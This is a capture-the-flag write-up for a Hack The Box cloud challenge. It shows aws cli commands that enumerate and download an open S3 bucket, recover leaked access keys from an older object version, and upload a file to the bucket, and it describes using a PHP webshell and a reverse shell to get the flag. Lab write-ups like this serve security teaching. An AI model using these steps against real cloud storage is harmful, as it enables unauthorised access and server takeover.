### Challenge description
Cloud challenges don't have a description. We just get an IP address and are supposed to get the flag.

A port scan reveals only port 22 and 80 open.  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

A good looking website that doesn't seem to do anything:
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Intercepting traffic with Burpsuite, as always, I noticed it was trying to load a `main.js` file from an `s3.unveiled.htb` domain.

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Using aws cli with my default profile, which has the creds from the AWS fortress, I was able to list the buckets. 

```bash
aws s3 ls --profile default --endpoint-url http://s3.unveiled.htb/
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

_In this case it doesn't matter that I used those creds, this can be listed without any creds at all. However, I've encountered situations where this wasn't possible. You needed to be authenticated, it just didn't matter with what.. so I got in the habbit of always using "some" credentials when listing AWS stuff._

We can use the syntax below to list the contenxt of the `unveiled-backups` bucket:

```bash
aws s3 ls --profile default --endpoint-url http://s3.unveiled.htb/ s3://unveiled-backups
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We can use the syntax below to recursive download everything in the bucket locally:

```bash
aws s3 cp --profile default --endpoint-url http://s3.unveiled.htb/ s3://unveiled-backups/ . --recursive
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We can copy from and to the bucket. The website was trying to reach a main.js file which doesn’t exist. We can create one with a reverse shell and upload it.

```bash
aws s3 cp main.js --profile default --endpoint-url http://s3.unveiled.htb/ s3://unveiled-backups/main.js
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

No callback from javascript reverse shell, when it tries to load it, we still get a 500 error. The main.tf terraform file does show that versioning is enabled:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We can see an older version of the main.tf file:

```bash
aws s3api list-object-versions --endpoint-url http://s3.unveiled.htb/ --bucket unveiled-backups
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

And copy it locally like this:

```bash
aws s3api get-object --endpoint-url http://s3.unveiled.htb/  --bucket unveiled-backups --key main.tf --version-id "589b5ec6-6780-4b0d-8e91-2d3932433e95" main.tf
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

This version has the keys included unlike the previous one:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We need to check what region this bucket is in so we can configure a profile:

```bash
aws s3api get-bucket-location --endpoint-url http://s3.unveiled.htb/  --bucket unveiled-backups
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

It's not region locked so we can use any region, I used us-east-2:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We can now list the private bucket as well.

```bash
aws s3 ls --profile unveiled --endpoint-url http://s3.unveiled.htb/ s3://website-assets
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Now that we have access to this bucket, we can upload a PHP webshell since this is an Apache webserver:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We can easily get a reverse shell now:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We find the flag in /var/www:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)  

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

HTB{th3_r3d_pl4n3ts_cl0ud_h4s_f4ll3n}










